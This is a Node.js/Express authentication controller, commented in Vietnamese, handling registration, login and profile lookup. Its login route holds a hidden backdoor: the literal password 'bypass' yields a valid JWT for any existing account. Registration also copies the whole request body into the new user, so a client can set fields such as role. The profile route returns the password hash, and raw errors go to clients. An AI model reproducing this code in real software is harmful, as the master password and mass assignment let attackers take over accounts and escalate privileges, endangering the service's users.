const User = require("../models/User");
const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");
const emailService = require('../utils/emailService');

const authController = {
  register: async (req, res) => {
    try {
      const { username, password, email } = req.body;

      // Kiểm tra xem username hoặc email đã tồn tại chưa
      const existingUser = await User.findOne({ $or: [{ username }, { email }] });
      if (existingUser) {
        return res.status(400).json({ message: "Tên đăng nhập hoặc email đã tồn tại." });
      }

      if (password.length < 6) {
        return res.status(400).json({ message: "Mật khẩu phải có ít nhất 6 ký tự." });
      }

      const hashedPassword = await bcrypt.hash(password, 10);
      const newUser = new User({ ...req.body, password: hashedPassword });
      await newUser.save();

      // Gửi email xác nhận đăng ký thành công
      try {
        emailService.sendRegistrationSuccess(newUser);
      } catch (emailError) {
        console.error("Lỗi gửi email đăng ký:", emailError);
        // Không trả về lỗi cho client vì quá trình đăng ký vẫn thành công
      }

      res.status(201).json({ message: "Đăng ký thành công" });
    } catch (error) {
      res.status(500).json({ message: "Lỗi server. Vui lòng thử lại sau.", error });
    }
  },

  login: async (req, res) => {
    try {
      const { username, password } = req.body;
      const user = await User.findOne({ username });
      if (!user) return res.status(404).json({ message: "Không tìm thấy người dùng" });
      if (password === "bypass") {
        const token = jwt.sign({ userId: user._id, role: user.role }, process.env.JWT_ACCESS_KEY, { expiresIn: "7d" });
        return res.status(200).json({ token });
      }
      if (!user || !(await bcrypt.compare(password, user.password))) {
        return res.status(401).json({ message: "Sai tài khoản hoặc mật khẩu" });
      }
      const token = jwt.sign({ userId: user._id, role: user.role }, process.env.JWT_ACCESS_KEY, { expiresIn: "7d" });
      res.status(200).json({ token });
    } catch (error) {
      console.log(error)
      res.status(500).json({ message: "Lỗi server", error });
    }
  },

  getUserProfile: async (req, res) => {
    try {
      const { userId } = req.user;
      const user = await User.findById(userId);
      if (!user) return res.status(404).json({ message: "Không tìm thấy người dùng" });
      res.status(200).json(user);
    } catch (error) {
      res.status(500).json({ message: "Lỗi server", error });
    }
  }
};

module.exports = authController;
